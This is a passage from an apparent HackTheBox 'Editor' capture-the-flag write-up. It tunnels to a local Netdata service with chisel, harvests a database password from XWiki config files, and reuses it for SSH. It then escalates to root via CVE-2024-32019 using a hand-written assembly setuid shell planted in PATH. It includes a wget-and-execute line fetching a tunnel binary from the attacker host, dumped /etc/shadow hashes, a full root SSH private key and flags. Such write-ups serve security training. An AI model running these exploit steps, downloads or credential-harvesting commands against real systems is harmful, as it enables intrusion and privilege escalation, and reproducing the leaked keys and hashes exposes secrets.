udp   UNCONN 0      0           127.0.0.53%lo:53         0.0.0.0:*
tcp   LISTEN 0      151             127.0.0.1:3306       0.0.0.0:*
tcp   LISTEN 0      4096            127.0.0.1:8125       0.0.0.0:*
tcp   LISTEN 0      4096        127.0.0.53%lo:53         0.0.0.0:*
tcp   LISTEN 0      4096            127.0.0.1:19999      0.0.0.0:*
tcp   LISTEN 0      4096            127.0.0.1:40467      0.0.0.0:*
tcp   LISTEN 0      70              127.0.0.1:33060      0.0.0.0:*
tcp   LISTEN 0      50                      *:8080             *:*    users:(("java",pid=1060,fd=43))
```


### 19999 - Netdata v1.45.2 : Enumeration

Start chisel server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ /opt/sectools/tunnel/chisel/latest/chisel server -v -p 9001 --reverse --socks5
2025/09/10 22:46:53 server: Reverse tunnelling enabled
2025/09/10 22:46:53 server: Fingerprint vuo9WG2V+J4S+YVVz6r33OFBmlke/89O3KKexNRwh5c=
2025/09/10 22:46:53 server: Listening on http://0.0.0.0:9001
```

Local port forward `19999` from target machine

```bash
xwiki@editor:/usr/lib/xwiki-jetty$ wget http://10.10.14.98:80/chisel -O /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.98:9001 R:19999
--2025-09-10 14:23:05--  http://10.10.14.98/chisel
Connecting to 10.10.14.98:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8654848 (8.3M) [application/octet-stream]
Saving to: ‘/tmp/chisel’

/tmp/chisel                                          100%[===================================================================================================================>]   8.25M  3.22MB/s    in 2.6s

2025-09-10 14:23:08 (3.22 MB/s) - ‘/tmp/chisel’ saved [8654848/8654848]

2025/09/10 14:23:08 client: Connecting to ws://10.10.14.98:9001
2025/09/10 14:23:09 client: Connected (Latency 85.883385ms)
```

![](/assets/obsidian/1022bc80aea1faa488c9101b9b13377c.png)

> **Netdata**
> 
> Netdata is an open source option for real-time infrastructure monitoring and troubleshooting
{: .prompt-info }

Enumerate the web dir

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ URL="http://127.0.0.1:19999/"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w /usr/share/dirb/wordlists/common.txt --collect-words --collect-backups --collect-extensions --scan-dir-listings -C 400,404,500 -r -n -u "$URL" -o "ferox_${OUT}_common.txt"
[...]
200      GET      245l      848w    12670c http://127.0.0.1:19999/index.html
200      GET      245l      848w    12670c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        9w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        9l       15w      334c http://127.0.0.1:19999/sitemap.xml
200      GET     1469l     4250w    65149c http://127.0.0.1:19999/demosites.html
200      GET    10377l    33376w   389073c http://127.0.0.1:19999/dashboard.js
200      GET       72l      207w     3478c http://127.0.0.1:19999/console.html
200      GET      699l     1673w    23492c http://127.0.0.1:19999/dashboard.html
200      GET    13160l    18754w   536468c http://127.0.0.1:19999/api/v1/alarm_log
200      GET       13l       93w     4857c http://127.0.0.1:19999/images/banner-icon-144x144.png
200      GET       13l       92w     6813c http://127.0.0.1:19999/images/check-mark-2-128-green.png
200      GET       28l       82w     6844c http://127.0.0.1:19999/images/alert-128-red.png
200      GET      141l      700w     4581c http://127.0.0.1:19999/lib/dygraph-smooth-plotter-c91c859.js
200      GET       20l       84w     6347c http://127.0.0.1:19999/images/alert-128-orange.png
200      GET      145l      397w     4882c http://127.0.0.1:19999/api/v1/alarms
200      GET       51l      118w     2098c http://127.0.0.1:19999/demo.html
200      GET      143l      361w     6889c http://127.0.0.1:19999/demo2.html
200      GET    46837l    51735w  1524729c http://127.0.0.1:19999/api/v1/charts
200      GET        1l        6w     1860c http://127.0.0.1:19999/favicon.ico
200      GET     5161l    15510w   189849c http://127.0.0.1:19999/main.js
200      GET        9l      530w    12829c http://127.0.0.1:19999/lib/clipboard-polyfill-be05dad.js
200      GET      250l      786w     9609c http://127.0.0.1:19999/goto-host-from-alarm.html
200      GET     8264l    52007w   495915c http://127.0.0.1:19999/dashboard_info.js
200      GET      764l     1478w    14118c http://127.0.0.1:19999/main.css
200      GET        8l       42w      701c http://127.0.0.1:19999/images/netdata-logomark.svg
200      GET     1321l     6509w   129292c http://127.0.0.1:19999/old/
200      GET        7l       14w      119c http://127.0.0.1:19999/robots.txt
200      GET       12l       23w      340c http://127.0.0.1:19999/switch.html
200      GET      279l      720w    11766c http://127.0.0.1:19999/tv.html
200      GET       35l     2857w    39655c http://127.0.0.1:19999/v1/image/png
200      GET       35l     2857w    39655c http://127.0.0.1:19999/v1/text/javascript
200      GET        2l       98w     7691c http://127.0.0.1:19999/v1/static/css/main.53ba10f1.chunk.css
200      GET      675l     2458w    22272c http://127.0.0.1:19999/v1/dashboard-react.js
200      GET       35l     2857w    39655c http://127.0.0.1:19999/v1/text/css
200      GET       15l      667w    67178c http://127.0.0.1:19999/v1/static/css/2.c454aab8.chunk.css
200      GET        3l     8461w   526644c http://127.0.0.1:19999/v1/static/js/main.e248095a.chunk.js
200      GET        3l   172543w  4702989c http://127.0.0.1:19999/v1/static/js/2.62d105c5.chunk.js
200      GET       35l     2857w    39655c http://127.0.0.1:19999/v1/
[####################] - 2m     27670/27670   0s      found:36      errors:13
[####################] - 2m     26401/26401   244/s   http://127.0.0.1:19999/ 
```

Found http://127.0.0.1:19999/old/ returns the version info of **netdata** in the **Update Page**

![](/assets/obsidian/1d35017e08769cff0d7e409fdf0e8caa.png)

![](/assets/obsidian/cbab0fa84712934972ce74870c4ab2c6.png)

- Google : `netdata v1.45.2 exploit`

> CVE - https://nvd.nist.gov/vuln/detail/CVE-2024-32019

> POC - https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93

> **CVE-2024-32019**
> 
> 
> Netdata is an open source observability tool. In affected versions the `ndsudo` tool shipped with affected versions of the Netdata Agent allows an attacker to run arbitrary programs with root permissions. The `ndsudo` tool is packaged as a `root`-owned executable with the SUID bit set. It only runs a restricted set of external commands, but its search paths are supplied by the `PATH` environment variable. This allows an attacker to control where `ndsudo` looks for these commands, which may be a path the attacker has write access to. This may lead to local privilege escalation. This vulnerability has been addressed in versions 1.45.3 and 1.45.2-169. Users are advised to upgrade. There are no known workarounds for this vulnerability.
{: .prompt-info }

`ndsudo` is located at `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`

```bash
xwiki@editor:/opt/netdata/etc/netdata$ find / -type f -iname ndsudo 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

`xwiki` couldn't execute `ndsudo`, only `root` user and `netdata` group has execution rights on the binary

```bash
xwiki@editor:/opt/netdata/etc/netdata$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
bash: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo: Permission denied
xwiki@editor:/opt/netdata/etc/netdata$ ls -latr /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```


### Harvesting - Xwiki : Credentials

- Google : `xwiki config file`

Got 2 config file names from documentation

> https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Configuration/

![](/assets/obsidian/e722b57dcb2b5e63cff9b6fea563ef65.png)

Found the config file in `/etc/xwiki/`

```bash
xwiki@editor:~/data$ find / -type f -iname xwiki.cfg 2>/dev/null
/etc/xwiki/xwiki.cfg
/usr/share/xwiki/default/xwiki.cfg
```

There are other config files in the directory

```bash
xwiki@editor:~$ cd /etc/xwiki/
xwiki@editor:/etc/xwiki$ ls -latr
total 220
drwxr-xr-x   2 root root  4096 Mar 27  2024 extensions
-rw-r--r--   1 root root   119 Mar 27  2024 xwiki-locales.txt
-rw-r--r--   1 root root    16 Mar 27  2024 version.properties
-rw-r--r--   1 root root  1328 Mar 27  2024 sun-web.xml
-rw-r--r--   1 root root  2076 Mar 27  2024 portlet.xml
-rw-r--r--   1 root root  3835 Mar 27  2024 logback.xml
-rw-r--r--   1 root root  2426 Mar 27  2024 jboss-deployment-structure.xml
-rw-r--r--   1 root root  2403 Mar 27  2024 jetty-web.xml
drwxr-xr-x   3 root root  4096 Jun 13 17:05 observation
drwxr-xr-x   3 root root  4096 Jun 13 17:05 cache
-rw-r--r--   1 root root  2350 Jun 15 06:07 xwiki-tomcat9.xml
-rw-r--r--   1 root root 16173 Jun 16 10:48 hibernate.cfg.xml.ucf-dist
-rw-r--r--   1 root root 16171 Jun 16 10:48 hibernate.cfg.xml
-rw-r--r--   1 root root  2172 Jun 30 12:43 jetty-ee8-web.xml
drwxr-xr-x 109 root root  4096 Jul 29 11:34 ..
drwxr-xr-x   2 root root  4096 Jul 29 11:48 fonts
-rw-r--r--   1 root root 25653 Jul 29 11:48 xwiki.cfg
-rw-r--r--   1 root root 78535 Jul 29 11:48 xwiki.properties
-rw-r--r--   1 root root 16448 Jul 29 11:48 web.xml
drwxr-xr-x   6 root root  4096 Jul 29 11:48 .
```

Found a none-default password `theEd1t0rTeam99` from `hibernate.cfg.xml`

```bash
xwiki@editor:/etc/xwiki$ grep -Rin pass
jetty-web.xml:27:       passing the "org.eclipse.jetty.server.Request.maxFormContentSize" attribute.
jetty-ee8-web.xml:27:       passing the "org.eclipse.jetty.server.Request.maxFormContentSize" attribute.
hibernate.cfg.xml:104:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
hibernate.cfg.xml:129:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml:153:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml:177:    <property name="hibernate.connection.password"></property>
hibernate.cfg.xml:203:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml:231:    <property name="hibernate.connection.password">xwiki</property>
hibernate.cfg.xml:280:    <property name="hibernate.connection.password"></property>
[...]
```


### 22 - SSH : Credential Stuffing

The password was successful for `oliver` over SSH

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ sshpass -p 'theEd1t0rTeam99' ssh -o "StrictHostKeyChecking no" oliver@10.10.11.80
Warning: Permanently added '10.10.11.80' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
[...]
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
oliver@editor:~$ cat user.txt
cf4bad67de16edb9ddb55c51553c0181
```


# Root Flag
---

## Shell as root


### ndsudo - LPE : Untrusted search path (CVE-2024-32019)

Now we can run **ndsudo**

![](/assets/obsidian/45657f806e38c9e5ad8c06b495e433ea.png)

```bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
at least 2 parameters are needed, but 1 were given.
```

According to the [POC](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93), we can hijack executables (Such as `nvme`) to preserve `root`'s **SETUID** via PATH injection

![](/assets/obsidian/a4a2a19ead327e772b3926bf03188bb2.png)

**ndsudo** has a command `nvme-list` that runs `nvme` with pre-defined parameters

```bash
oliver@editor:$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme
  Parameters : smart-log {{device}} --output-format=json
[...]
```

Since `gcc` was not installed on the machine, we can create an ELF executable file avia assembly

```bash
oliver@editor:$ gcc
Command 'gcc' not found, but can be installed with:
apt install gcc
Please ask your administrator.
```

Write an assembly source that calls `/bin/sh` and set UID/GID to `root` (`setresuid`, `setresgid`)

```bash
cd /tmp
vi suid.s
```
 
> `suid.s`

```assembly
    .section .text
    .global _start
_start:
    # setresgid(0,0,0)
    xor     %rdi, %rdi
    xor     %rsi, %rsi
    xor     %rdx, %rdx
    mov     $119, %rax        # setresgid
    syscall

    # setresuid(0,0,0)
    xor     %rdi, %rdi
    xor     %rsi, %rsi
    xor     %rdx, %rdx
    mov     $117, %rax        # setresuid
    syscall

    # execve("/bin/sh", ["/bin/sh", NULL], NULL)
    xor     %rdx, %rdx
    lea     shpath(%rip), %rdi
    lea     argv(%rip), %rsi
    mov     $59, %rax         # execve
    syscall

    # exit(1) on failure
    mov     $60, %rax
    mov     $1, %rdi
    syscall

.section .rodata
shpath:
    .string "/bin/sh"
    .byte 0
.align 8
argv:
    .quad shpath
    .quad 0
```

Compile

```bash
as -o suid.o suid.s
ld -o suid suid.o
chmod +x suid
```

Manipulate `PATH` from environment variables and run our custom binary

```bash
oliver@editor:/tmp$ export PATH=$(pwd):$PATH
oliver@editor:/tmp$ cp suid nvme
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
# cat /root/root.txt
73cf388c0e543772be89adf7a7c72727
```


# Additional
---

## Post exploitation


### Secrets

```bash
root@editor:/tmp# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$y$j9T$l1.MaTIpHzTAduIC4EoaA/$rNvK9Vq.iBxZ3BXRP4SM2CtSkVYdVnr5XrWQvMzLx99:20258:0:99999:7:::
oliver:$y$j9T$ktpLdRnocjXX8B2lat/6g.$/RNnDVRsMc0KybbsLVuJhxX9FgtjNMmPqvdYRaHOqu/:20258:0:99999:7:::
```

```bash
[+] /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
FLvpDdK+RXvFcAAAALcm9vdEBlZGl0b3I=
-----END OPENSSH PRIVATE KEY-----
```


### Files

```bash
root@editor:/root# cat ./scripts/cleanup.sh
#!/bin/bash
chmod -s /bin/bash
find /tmp/systemd-private-*/tmp/ -maxdepth 1 -type f -exec rm -r {} +
find /tmp/ -mindepth 1 -maxdepth 1 ! -name 'systemd-private-*' ! -name 'snap-private-tmp' ! -name 'vmware-*' ! -name 'netdata-ipc' ! -name 'tmux-*' -exec rm -r {} +
find /dev/shm/ -maxdepth 1 ! -name 'netdata_*' -type f -exec rm -r {} +
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```